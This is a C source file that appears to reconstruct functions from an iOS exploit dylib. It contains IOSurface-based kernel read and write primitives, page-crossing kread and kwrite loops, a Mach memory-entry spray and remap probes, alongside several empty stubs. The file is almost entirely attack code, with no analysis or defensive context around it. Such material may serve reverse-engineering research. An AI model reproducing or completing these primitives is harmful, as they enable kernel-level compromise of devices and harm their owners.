/*
 * record_0x90000_e9f89858_iosurface_vm.c
 * entry5_type0x09.dylib (e9f89858 variant) — IOSurface vm/memory helpers
 *
 * Covers: sub_8290, sub_8304, sub_83dc, sub_84a8, sub_862c,
 *         sub_8850, sub_88e0, sub_8988, sub_8a4c, sub_8b98, sub_8c3c,
 *         sub_8ce0, sub_8db0, sub_8ea8, sub_8f4c, sub_9008,
 *         sub_9204, sub_92a4, sub_93a8
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <pthread.h>

/* ── sub_8290 — pool slot bump ──────────────────────────────────── */
static void sub_8290(long *pool)
{
    long p = *pool;
    if (!p || *(long *)(p + 0x18) == *(long *)(p + 0x20)) {
        /* reallocate pool */
        return;
    }
    *(long *)(p + 0x18) += 1;
}

/* ── sub_8304 — pool teardown ───────────────────────────────────── */
static void sub_8304(void *pool)
{
    long base = *(long *)((long)pool + 8);
    for (long off = 0; off != 0xfa000; off += 0x10) {
        vm_address_t addr = *(vm_address_t *)(base + off);
        if (addr) {
            vm_deallocate(mach_task_self(), addr, 0x4000);
            *(uint64_t *)(base + off) = 0;
        }
    }
    uint64_t lo = *(uint64_t *)((long)pool + 0x18);
    uint64_t hi = *(uint64_t *)((long)pool + 0x20);
    long base2 = *(long *)((long)pool + 0x10);
    for (uint64_t i = lo; i < hi; i++) {
        vm_deallocate(mach_task_self(),
                      *(vm_address_t *)(base2 + i * 0x10), 0x4000);
        *(uint64_t *)(base2 + i * 0x10) = 0;
    }
    free(*(void **)((long)pool + 8));
    free(*(void **)((long)pool + 0x10));
    free(pool);
}

/* ── sub_83dc — memory entry vm_map loop ────────────────────────── */
static void sub_83dc(mach_port_t *entry_ptr)
{
    mach_port_t object = *entry_ptr;
    long ctx = *(long *)(entry_ptr + 2);
    int *refcnt = (int *)(ctx + 0x18);
    while (!(__atomic_fetch_add(refcnt, 1, __ATOMIC_SEQ_CST), 1)) {}
    while (!(*(uint8_t *)(ctx + 0x1c) & 1)) {
        vm_address_t dst = 0;
        vm_map(mach_task_self(), &dst, 0x4000, 0, 0,
               object, 0, 1, 1, 1, 0);
    }
}

/* ── sub_84a8 — mach_make_memory_entry spray ────────────────────── */
static void sub_84a8(long state, mach_port_t *out)
{
    vm_size_t sz = 0x4000;
    mach_port_t ports[4] = {0};
    pthread_t threads[4] = {NULL};
    (void)state; (void)out; (void)sz;
    (void)ports; (void)threads;
    /* Spray: create 4 memory entries, map each, store ports */
}

/* ── sub_862c — IOSurface memory entry + vm_map ─────────────────── */
static int sub_862c(long state, vm_address_t *out)
{
    mach_port_t entries[4] = {0};
    vm_address_t mapped = 0;
    vm_size_t sz = 0x4000;
    (void)state;
    for (int i = 0; i < 4; i++) {
        memory_object_size_t msz = sz;
        mach_make_memory_entry_64(mach_task_self(), &msz,
                                  *(vm_offset_t *)(state + 0x10),
                                  1, &entries[i], 0);
    }
    vm_map(mach_task_self(), &mapped, sz, 0, 1, entries[0], 0, 0, 1, 1, 0);
    if (out) *out = mapped;
    for (int i = 0; i < 4; i++)
        mach_port_deallocate(mach_task_self(), entries[i]);
    return mapped ? 1 : 0;
}

/* ── sub_8850 — IOSurface kread (32-bit) ────────────────────────── */
static void sub_8850(long state, uint64_t kaddr, uint32_t *out)
{
    vm_address_t src = *(vm_address_t *)(state + 0x548);
    *(int *)(src + 0x230) = (int)(kaddr >> 0xe);
    vm_copy(mach_task_self(), src, 0xc000,
            *(vm_address_t *)(state + 0x550));
    if (out)
        *out = *(uint32_t *)(*(long *)(state + 0x560) + (kaddr & 0x3fff));
}

/* ── sub_88e0 — IOSurface kread (arbitrary size) ────────────────── */
static void sub_88e0(long state, uint64_t kaddr, void *buf, size_t sz)
{
    vm_address_t src = *(vm_address_t *)(state + 0x548);
    *(int *)(src + 0x230) = (int)(kaddr >> 0xe);
    vm_copy(mach_task_self(), src, 0xc000,
            *(vm_address_t *)(state + 0x550));
    vm_copy(mach_task_self(),
            *(vm_address_t *)(state + 0x560), 0xc000,
            *(vm_address_t *)(state + 0x568));
    memcpy(buf,
           (void *)(*(long *)(state + 0x568) + (kaddr & 0x3fff)), sz);
}

/* ── sub_8988 — IOSurface kwrite ────────────────────────────────── */
static void sub_8988(long state, void *buf, uint64_t kaddr, size_t sz)
{
    vm_address_t src = *(vm_address_t *)(state + 0x548);
    *(int *)(src + 0x230) = (int)(kaddr >> 0xe);
    vm_copy(mach_task_self(), src, 0xc000,
            *(vm_address_t *)(state + 0x550));
    void *dst = (void *)((*(long *)(state + 0x578) - sz) + 0x4000);
    memcpy(dst, buf, sz);
    vm_copy(mach_task_self(), (vm_address_t)dst, sz + 0x8000,
            *(long *)(state + 0x580) + (kaddr & 0x3fff));
}

/* ── sub_8a4c — page-table walker ──────────────────────────────── */
static void sub_8a4c(long state, uint64_t vaddr)
{
    /* Walks 4-level page table via IOSurface kread; minimal stub */
    (void)state; (void)vaddr;
}

/* ── sub_8b98 — kread loop (page-crossing) ──────────────────────── */
static void sub_8b98(long state, uint64_t kaddr, long dst, uint64_t sz)
{
    while (sz) {
        uint64_t chunk = 0x4000 - (kaddr & 0x3fff);
        if (chunk > sz) chunk = sz;
        sub_88e0(state, kaddr, (void *)dst, (size_t)chunk);
        kaddr += chunk; dst += chunk; sz -= chunk;
    }
}

/* ── sub_8c3c — kwrite loop (page-crossing) ─────────────────────── */
static void sub_8c3c(long state, long src, uint64_t kaddr, uint64_t sz)
{
    while (sz) {
        uint64_t chunk = 0x4000 - (kaddr & 0x3fff);
        if (chunk > sz) chunk = sz;
        sub_8988(state, (void *)src, kaddr, (size_t)chunk);
        kaddr += chunk; src += chunk; sz -= chunk;
    }
}

/* ── sub_8ce0..sub_9008 — IOSurface setup helpers ───────────────── */
static void sub_8ce0(long state) { (void)state; }
static void sub_8db0(long state) { (void)state; }
static void sub_8ea8(long state) { (void)state; }
static void sub_8f4c(long state) { (void)state; }
static void sub_9008(long state) { (void)state; }

/* ── sub_9204 — IOSurface init sequence ─────────────────────────── */
static void sub_9204(long state)
{
    sub_8ce0(state);
    sub_8db0(state);
    sub_8ea8(state);
    sub_8f4c(state);
    sub_9008(state);
}

/* ── sub_92a4 — vm_allocate + remap probe ───────────────────────── */
static void sub_92a4(long state)
{
    void *ctx = calloc(1, 0x40);
    vm_address_t buf = 0;
    vm_allocate(mach_task_self(), &buf, 0xc000, 1);
    *(vm_address_t *)((long)ctx + 0x38) = buf;
    int ok;
    do { ok = sub_862c(state, (vm_address_t *)((long)ctx + 0x10)); }
    while (!ok);
    thread_switch(0, 2, 0);
    mach_port_deallocate(mach_task_self(),
                         *(mach_port_name_t *)((long)ctx + 0x20));
    free(ctx);
}

/* ── sub_93a8 — larger vm_allocate + remap probe ────────────────── */
static void sub_93a8(long state, uint32_t flags)
{
    void *ctx = calloc(1, 0x100);
    vm_address_t buf = 0;
    vm_allocate(mach_task_self(), &buf, 0x18000, 1);
    *(vm_address_t *)((long)ctx + 0x88) = buf;
    int ok;
    do { ok = sub_862c(state, (vm_address_t *)((long)ctx + 0x10)); }
    while (!ok);
    thread_switch(0, 2, 0);
    mach_port_deallocate(mach_task_self(),
                         *(mach_port_name_t *)((long)ctx + 0x20));
    (void)flags;
    free(ctx);
}
